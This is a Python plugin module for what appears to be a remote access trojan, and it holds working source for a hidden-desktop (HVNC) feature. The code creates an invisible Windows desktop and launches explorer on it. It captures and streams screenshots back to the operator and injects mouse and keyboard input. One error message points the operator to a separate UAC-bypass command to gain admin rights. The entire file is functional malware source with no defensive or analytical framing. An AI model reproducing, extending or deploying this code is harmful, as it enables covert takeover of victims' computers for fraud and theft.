PLUGIN = {"name": "hvnc", "desc": "Hidden desktop (HVNC) with mouse/keyboard control & real-time streaming", "deps": [], "size": 6.0}

STUB_CODE = r"""
_hvnc_name = "Whisper_HVNC_" + str(os.getpid())
_hvnc_desk = None
_hvnc_run = [False]
_DESKTOP_ACCESS = 0x1000

def _hvnc_thread():
    global _hvnc_desk
    import ctypes
    u32 = ctypes.windll.user32
    desk = u32.CreateDesktopW(_hvnc_name, None, None, 0, _DESKTOP_ACCESS, None)
    if not desk:
        _hvnc_desk = None; _hvnc_run[0] = False; return
    _hvnc_desk = desk; _hvnc_run[0] = True
    try:
        si = subprocess.STARTUPINFO()
        si.lpDesktop = _hvnc_name
        subprocess.Popen(["explorer.exe"], startupinfo=si, close_fds=True)
        while _hvnc_run[0] and desk:
            time.sleep(2)
    finally:
        if desk: u32.CloseDesktop(desk)
        _hvnc_desk = None; _hvnc_run[0] = False

def _cmd_hvnc_start(m):
    if _hvnc_run[0]: return {"output": "[!] HVNC already running"}
    import ctypes
    if not ctypes.windll.shell32.IsUserAnAdmin():
        return {"output": "[!] HVNC requires admin. Use uac_bypass command first to spawn an elevated agent, then use HVNC on that new client."}
    threading.Thread(target=_hvnc_thread, daemon=True).start()
    time.sleep(0.5)
    if _hvnc_desk: return {"output": f"[+] HVNC started on desktop '{_hvnc_name}'"}
    return {"output": "[!] HVNC failed - create desktop failed (need interactive session with desktop creation rights)"}

def _cmd_hvnc_stop(m):
    _hvnc_run[0] = False; return {"output": "[+] HVNC stopped"}

def _ss_gdi(desk_handle=None):
    try:
        import ctypes, struct
        u32 = ctypes.windll.user32; g32 = ctypes.windll.gdi32
        cur = u32.OpenInputDesktop(0, False, 0x0100)
        if desk_handle and not u32.SwitchDesktop(desk_handle):
            if cur: u32.CloseDesktop(cur)
            return None
        ctypes.windll.kernel32.Sleep(200)
        w, h = u32.GetSystemMetrics(0), u32.GetSystemMetrics(1)
        hdc_src = u32.GetDC(None)
        hdc_dst = g32.CreateCompatibleDC(hdc_src)
        hbmp = g32.CreateCompatibleBitmap(hdc_src, w, h)
        g32.SelectObject(hdc_dst, hbmp)
        g32.BitBlt(hdc_dst, 0, 0, w, h, hdc_src, 0, 0, 0x00CC0020)
        W = ctypes.wintypes
        class BIH(ctypes.Structure):
            _fields_ = [("s", W.DWORD), ("w", W.LONG), ("h", W.LONG),
                        ("p", W.WORD), ("b", W.WORD), ("c", W.DWORD),
                        ("s2", W.DWORD), ("x", W.LONG), ("y", W.LONG),
                        ("u", W.DWORD), ("v", W.DWORD)]
        bih = BIH(40, w, h, 1, 32, 0, 0, 0, 0, 0, 0)
        sz = w * h * 4; bits = (ctypes.c_byte * sz)()
        g32.GetDIBits(hdc_dst, hbmp, 0, h, bits, ctypes.byref(bih), 0)
        u32.ReleaseDC(None, hdc_src); g32.DeleteDC(hdc_dst); g32.DeleteObject(hbmp)
        hdr = struct.pack("<HIHHI", 0x4D42, 54 + sz, 0, 0, 54)
        if cur: u32.SwitchDesktop(cur); u32.CloseDesktop(cur)
        return hdr + ctypes.string_at(ctypes.byref(bih), 40) + bytes(bits)
    except: return None

def _cmd_hvnc_screenshot(m):
    try:
        if not _hvnc_desk: return {"output": "[!] HVNC not running"}
        bmp = _ss_gdi(_hvnc_desk)
        if bmp: return {"data": base64.b64encode(bmp).decode()}
        return {"output": "[!] HVNC screenshot failed"}
    except Exception as e: return {"output": f"[!] HVNC screenshot: {e}"}

def _cmd_hvnc_stream(m):
    try:
        if not _hvnc_desk: return {"output": "[!] HVNC not running"}
        count = min(m.get("count", 5), 20)
        delay = max(min(m.get("delay", 1), 5), 0.5)
        images = []
        for i in range(count):
            bmp = _ss_gdi(_hvnc_desk)
            if bmp: images.append(base64.b64encode(bmp).decode())
            time.sleep(delay)
        return {"data": images, "count": len(images)} if images else {"output": "[!] HVNC stream failed"}
    except Exception as e: return {"output": f"[!] HVNC stream: {e}"}

def _hvnc_send_input(input_type, flags, data, extra=0):
    try:
        import ctypes
        u32 = ctypes.windll.user32
        if not _hvnc_desk: return False
        cur = u32.OpenInputDesktop(0, False, 0x0100)
        if not u32.SwitchDesktop(_hvnc_desk):
            if cur: u32.CloseDesktop(cur)
            return False
        ctypes.windll.kernel32.Sleep(50)
        W = ctypes.wintypes
        class MOUSEI(ctypes.Structure):
            _fields_ = [("dx", W.LONG), ("dy", W.LONG), ("md", W.DWORD),
                        ("flags", W.DWORD), ("t", W.DWORD), ("ei", ctypes.POINTER(ctypes.c_ulong))]
        class KEYI(ctypes.Structure):
            _fields_ = [("vk", W.WORD), ("scan", W.WORD), ("flags", W.DWORD),
                        ("t", W.DWORD), ("ei", ctypes.POINTER(ctypes.c_ulong))]
        class _U(ctypes.Union):
            _fields_ = [("mi", MOUSEI), ("ki", KEYI), ("hi", ctypes.c_ulong * 3)]
        class INPUT(ctypes.Structure):
            _fields_ = [("type", W.DWORD), ("u", _U)]
        inp = INPUT()
        inp.type = input_type
        if input_type == 0:
            inp.u.mi = MOUSEI(data[0], data[1], extra, flags, 0, None)
        else:
            inp.u.ki = KEYI(data, extra, flags, 0, None)
        ret = u32.SendInput(1, ctypes.byref(inp), ctypes.sizeof(INPUT))
        if cur: u32.SwitchDesktop(cur); u32.CloseDesktop(cur)
        return ret == 1
    except: return False

def _cmd_hvnc_mouse(m):
    try:
        action = m.get("action", "move")
        x = int(m.get("x", 0)); y = int(m.get("y", 0))
        acts = {"move": 0x0001, "click": 0x0002|0x0004, "rightclick": 0x0008|0x0010,
                "doubleclick": 0x0002|0x0004}
        if action not in acts: return {"output": f"[!] Unknown: {action}"}
        ok = _hvnc_send_input(0, acts[action], (x, y))
        if action == "doubleclick":
            time.sleep(0.05)
            ok = _hvnc_send_input(0, acts[action], (x, y))
        return {"output": f"[+] Mouse {action} ({x},{y}): {'OK' if ok else 'FAIL'}"}
    except Exception as e: return {"output": f"[!] HVNC mouse: {e}"}

def _cmd_hvnc_key(m):
    try:
        action = m.get("action", "press")
        if action == "type":
            text = m.get("text", "")
            for c in text:
                vk = ord(c.upper())
                _hvnc_send_input(1, 0, vk)
                _hvnc_send_input(1, 2, vk)
            return {"output": f"[+] Typed '{text[:50]}'"}
        key = int(m.get("key", 0))
        _hvnc_send_input(1, 0, key)
        _hvnc_send_input(1, 2, key)
        return {"output": "+ Key press OK"}
    except Exception as e: return {"output": f"[!] HVNC key: {e}"}

_CMDS["hvnc_start"] = _cmd_hvnc_start
_CMDS["hvnc_stop"] = _cmd_hvnc_stop
_CMDS["hvnc_screenshot"] = _cmd_hvnc_screenshot
_CMDS["hvnc_stream"] = _cmd_hvnc_stream
_CMDS["hvnc_mouse"] = _cmd_hvnc_mouse
_CMDS["hvnc_key"] = _cmd_hvnc_key
"""

def get_commands():
    return {"hvnc_start": "_cmd_hvnc_start", "hvnc_stop": "_cmd_hvnc_stop",
            "hvnc_screenshot": "_cmd_hvnc_screenshot", "hvnc_stream": "_cmd_hvnc_stream",
            "hvnc_mouse": "_cmd_hvnc_mouse", "hvnc_key": "_cmd_hvnc_key"}
